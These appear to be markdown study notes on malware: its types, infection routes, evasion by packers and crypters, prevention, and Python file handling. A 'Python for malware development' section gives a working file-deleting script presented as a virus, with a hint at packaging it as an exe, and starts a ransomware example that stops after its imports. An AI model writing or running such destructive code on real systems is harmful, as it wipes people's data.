# Malware
- Malware, short for malicious software, refers to any program or code intentionally designed to cause harm, disrupt, or compromise computer systems, networks, and devices.
- The name Malware Come from
    - Malicious => bad thing(desire)
    - Software => set of instruction(program)
- **what malwares do:**
    - Removing data/files
    - Encrypting data/files
    - Corrupting data/files
    - Stealing Data/files
    - Spying on user
# Types of malwares
- Based on their propagation/infection and attack, there are many kinds of malwares.
## 1. Trojan
- Trojan, is a type of malicious code or software that looks legitimate but can take control of your computer. 
- it is designed to damage, disrupt, steal, or in general inflict some other harmful action on your data or network.
- Trojans cannot replicate on their own. Instead, they rely on user interaction to execute. 
### common types of trojan actions
1. **Backdoor Trojans**
    - Create a secret “backdoor” for attackers to access the system.
    - It lets an attacker access your computer and control it. Your data can be downloaded by a third party and stolen. Or more malware can be uploaded to your device.
2.  **Banker Trojans**
    - This type of Trojan specifically targets personal information used for banking and other online transactions.
    - It’s designed to steal your account information for all the things you do online. That includes banking, credit card, and bill pay data.
3. **Trojan-Mailfinder** 
    - type of malware designed to harvest email addresses from a computer system.
    - The Trojan scans files, databases, and other data sources on the infected machine. It extracts email addresses found in documents, email clients, or web browsers. The stolen addresses are then sent to the malicious user via email, the web, FTP, or other methods.
4. **Remote Access Trojans (RATs)**
    - RATs are a different category of malware that provides attackers with unauthorized remote access to a victim’s computer.
    - Attackers can monitor user behavior, change settings, browse and copy files, and even utilize the victim’s bandwidth for criminal activities.
## 2. Worm
- A computer worm is a type of malware that spreads copies of itself from computer to computer. 
- Unlike viruses, which rely on human action for activation and need a host system to replicate, worms can propagate or self-replicate without human activation after breaching a system.
- A worm can spread across a network through Internet or Local Area Network (LAN) connections. It doesn’t need to attach itself to a software program to cause damage.
- there have been some particularly devastating worms:
    - **Morris Worm:** Also known as the Internet worm, this was one of the first computer worms to spread via the Internet and earn notoriety in the media.
    - **Blaster:** Also known as MSBlast, Lovesan, and Lovsan, this worm attacked computers running Windows XP and Windows 2000.
    - **ILOVEYOU:** The ILOVEYOU worm infected tens of millions of computers globally, resulting in billions of dollars in damage.
    - **Mydoom:** This became the fastest-spreading email worm in 2004, sending junk email across computers.
    - **SQL Slammer:** The SQL Slammer worm gained infamy for slowing down Internet traffic with denial-of-service attacks on some Internet hosts.
    - **Storm Worm:** This worm utilized social engineering with fake news of a disastrous storm to drop botnets on compromised machines.
    - **Stuxnet:** Some experts believe this sophisticated worm was developed for years to launch a cyberattack.
## 3. Virus
- A computer virus is a type of malware that, when executed, replicates itself by modifying other computer programs and inserting its own code into those programs.
- A virus attaches itself to another program (the host program). When the host program runs, the virus code executes first, causing infection and damage. Unlike standalone programs(worms), viruses need a host program to spread.
- **common signs of virus infection:**
    - Speed of System
    - Pop-up windows
    - Self-executing
    - Account being log out
    - Crashing of device
    - Mass emails being sent from you
    - Files and system settings are altered.
### common types of viruses
1. **Resident Viruses**
    - Viruses propagate themselves by infecting applications on a host computer. A resident virus achieves this by infecting applications as they are opened by a user.
    - A non-resident virus is capable of infecting executable files when programs are not running.
2. **Multipartite Viruses**
    - it Combine different infection techniques.
    - It will typically remain in the computer’s memory to infect the hard disk, then spread through and infect more drives by altering the content of applications. This results in performance lag and application memory running low. 
3. **Browser Hijackers**: 
    - Alter browser settings and redirect users.
    - A browser hijacker manually changes the settings of web browsers, such as replacing the homepage, editing the new tab page, and changing the default search engine. Technically, it is not a virus because it cannot infect files.
## 4. Ransome
- Ransomware is a type of cryptovirological malware that permanently blocks access to the victim’s personal data unless a ransom is paid. Here’s how it works:
- Ransomware encrypts the victim’s files, making them inaccessible. It demands a ransom payment (usually in cryptocurrencies like Bitcoin) to decrypt the files. In a properly implemented cryptoviral extortion attack, recovering the files without the decryption key is an intractable problem.
- Ransomware attacks are typically carried out using a Trojan disguised as a legitimate file. Users are tricked into downloading or opening the malicious file, often arriving as an email attachment.
- Some high-profile examples, like the WannaCry worm*, spread automatically between computers without user interaction.
- **WannaCry**: is a ransomware which targeted computers running the Microsoft Windows operating system by encrypting (locking) data and demanding ransom payments in the Bitcoin cryptocurrency.
## 5. Rootkit
- A rootkit is a collection of software designed to give attackers unauthorized access and control over a computer or application.
- Once activated, the rootkit sets up a backdoor exploit, providing a hidden entry point for further attacks.
- Rootkits are hard to detect and can conceal their presence within an infected system. 
- Rootkits often deliver additional malware, such as ransomware, bots, keyloggers, or trojans.
## 6. Adware
- Adware is a type of malicious software that secretly installs itself on your device and displays unwanted advertisements and pop-ups. 
- It often tracks your online behavior and presents personalized ads. Adware stands for advertising-supported software, designed to throw advertisements onto your screen, most commonly within a web browser. 
- While legitimate software applications may use online advertising, adware is an altogether different kettle of rotten fish.
# How malwares get infect
- **Malware** can infect your computer through various methods. Here are some common ways:
1. **Phishing Emails**: Hackers send malicious links, files, or attachments via phishing emails. When victims click on these assets, malware installs on their devices.
2. **Malicious Websites**: Visiting compromised or malicious websites can trigger drive-by downloads. These sites exploit vulnerabilities in your browser or plugins to deliver malware.
3. **Compromised Software**: Downloading software from untrusted sources can lead to malware infections. Cracked or pirated software often contains hidden malware.
4. **File Sharing**: Malware spreads through peer-to-peer (P2P) file-sharing networks. Downloading files from these networks can introduce malware.
5. **USB Devices**: Some hackers use infected USB sticks or flash drives to spread malware. Avoid inserting unfamiliar storage devices into your computer.
6. **Malvertising**: Infected ads loaded with malware download and install malicious programs when you click on pop-ups.
# How malwares stay hidden/ undetected
1. **Packers**
    - A packer is a program that compresses an executable to make it smaller. It wraps the compressed executable in the code necessary to decompress itself at runtime. Packing changes this the binary patterns and some hashes(day5) , so the AV may not detect the packed file.
2. **Crypters/encoders**
    - A crypter is similar to a packer but adds additional obfuscation or encryption to the mix. Like a packer, its goal is to change the binary fingerprint of a file to avoid detection. In a nutshell, the crypter encrypts the original executable using an encryption algorithm — often something as simple as a XOR cipher with a unique key.
3. **Polymorphic Malware**
    - At the highest level, polymorphic malware is malware that repeatedly uses packing and crypting methods to change the way it looks.
4. **Downloaders, Droppers, and Staged Loading**
    - Many kinds of malware use staging programs called droppers or downloaders to learn about a system before installing the real malware. Some of these droppers scope out a system first to avoid triggering security alerts when they download and install the real payload.
## Malware prevention
- Install anti-virus and anti-spyware software. (kaspersky, avg, smadav)
- Use secure authentication methods.
- 2-factor authentication
- Implement email security and spam protection
- Keep software updated
- Use the least-privilege model.
- Monitor for suspicious activity
- Educate your users
# Python for malware development
- As we saw malwares do so many things and we can develop that malware based on the algorithm, We need. 
- First we have to understand what our malware have to do. There are so many kinds of malware purpose
    - Delete files
    - Encrypt files
    - Corrupt files
- Then You can Convert your python file to executable(exe) by **py2exe technics**.
# Malware #1  -   File deleting malware
- The algorithm is simple, When it load the program will delete files
- The file being deleted is based on our plan, but if the file needs root access then we need to build the rootkit too.
 # Example:
- For simplicity, i will show you making a simple python program that will delete files in a folder which it is opened.
- Lets create a test folder and our virus.py file Also let’s create some random files for test.
   - In Vscode.
   - Import os package
   - **OS package is a module that helps us to interact and do some Terminal commands because as you know python is not like bash and cant run shell commands directly.**
```python
# to have shell access
import os
  
# to hold the name of files
files = []
# to hold the names of folders
folders = []

# checks the file names
for file in os.listdir():
    # and add then to files list but skipping the virus.py file
    if file != "virus.py":
        if os.path.isfile(file):
            files.append(file)
    # add to the folders list by checking with os.path.isfile()
        else:
            folders.append(file)
    else:
        pass
  
# iterates and detetes the files in files list
for i in files:
    os.remove(i)  
# iterates and deletes the folders in the folders list
for j in folders:
    os.removedirs(j) 

# displaying we hacked them
print("your system is infected and your files are gone!")
```
- **Result**: when we run virus.py in our terminal. it will remove all the files in the folder only leaving the virus.py
## File handling in python
- Files are names locations on disk to store related information. Files Used to Store Data in Storage Devices.
- When we want to read from or write to a file, we need to open it. And also when we are done we will close it.
- In Python ,a File Operation takes place in the following order: Open a File, Read or Write(perform operation), Close the file.
- **python has built-in functions:**
## open()
- Syntax: `with open(“fileName or filePath”,’x’) as var`
- Modes:
    -  write -----------------w
    - read-------------------r 
    - append---------------a 
    - Create---------------- x
    - text mode-------------t 
    - binary mode-----------b    

- the `open()` function does what the name implies, it opens a file for you so you can work with the file.
- The open() function takes up to 3 parameters – the filename, the mode, and the encoding. You can then specify what you want to do with the file in a print function.
- The read mode is the default file mode in Python, so if you don’t specify the mode
- That’s not all. The open() function does not close the file, so you also have to close the file with the close() method.
```py
my_file = open("hello.txt", "r")
print(my_file.read())
my_file.close()

# we dont have to use the r so:
my_file = open("hello.txt")
print(my_file.read())
```
- **Unlike `open()` where you have to close the file with the close() method, the `with` statement closes the file for you without you telling it to.**
- you can re-write the code we used in the open() function example like this:
```python
with open("hello.txt", "w") as my_file:
    my_file.write("Hello world \n")
    my_file.write("I hope you're doing well today \n")
    my_file.write("This is a text file \n")
    my_file.write("Have a nice time \n")

with open("hello.txt") as my_file:
    print(my_file.read())

# Output: 
# Hello world 
# I hope you're doing well today
# This is a text file
# Have a nice time
```

**Write Mode ("w")**:
- If the file exists, it truncates (over-writes) its content.
- If the file does not exist, it creates a new one.
- Syntax: `var.write(“Hello world”)`
**Read Mode ("r")**:
- Opens a file for reading. Raises an error if the file does not exist.
- `read()` - >This read file up to the inputted size number. but if you don’t add the size it will read it until the end.
- `readline()` -> To read files only one line
- `readlines()` -> reads all file in 1 line
**Append Mode ("a")**:
- If the file exists, it adds content to the end.
- If the file does not exist, it creates a new one.
    ```
    with open("example.txt", "a") as my_file:
        my_file.write("Appending more content.")
    ```
**Create mode ("x")**:
- Exclusive creation mode. Opens a file for exclusive creation. 
- If the file already exists, it raises a FileExistsError exception.
- syntax: `file_obj  = open("filename", "mode")`
```python
f = open("cFile.txt", "w")
f.write(" Created file")`
```
- to check if the file already exists:
```python
import os 
if os.path.exists(“filename”):
print(“the file already exist!”)
else:
print(“no file!”)

```
**Read and Write Mode ("r+")**:
- Opens a file for **both reading and writing**.
  - The file pointer is positioned at the **beginning** of the file.
```python
        with open("example.txt", "r+") as my_file:
            content = my_file.read()
            my_file.write("Adding new content.")    
 ```
# Malware #2 - File Ransomware
- Here we are going to do our own ransomware. So how do ransomware words…. Algorithm?
    - They scan the system files
    - They will encrypt them with some key
    - Done!
- We can do the decrypter to 
    - It accepts the key
    - Decrypt the system files
- For our example we just encrypt and decrypt of files in our test folder
- For this we can use **Fernet** module from cryptography package.
- first we need to install it:
`pip install cryptography `
- coding our ransomware:
```python
import os
from cryptography.fernet import Fernet

```


## Malware analysis
- Malware analysis is a process of analyzing malwares
- When a system is infected with malwares , Security testers will do analysis on that malware.
- But 1st then will hold the malware as sample it is called artifact Then They will do the analysis 
- There are 2 types of analysis
   - **Static Analysis**: Analyzing the virus, by just seeing the byte codes and the meta data.
   - **Dynamic Analysis**: is a process of analyzing the virus by running the malware in Sandbox/virtual machine. Then understanding the malware behavior
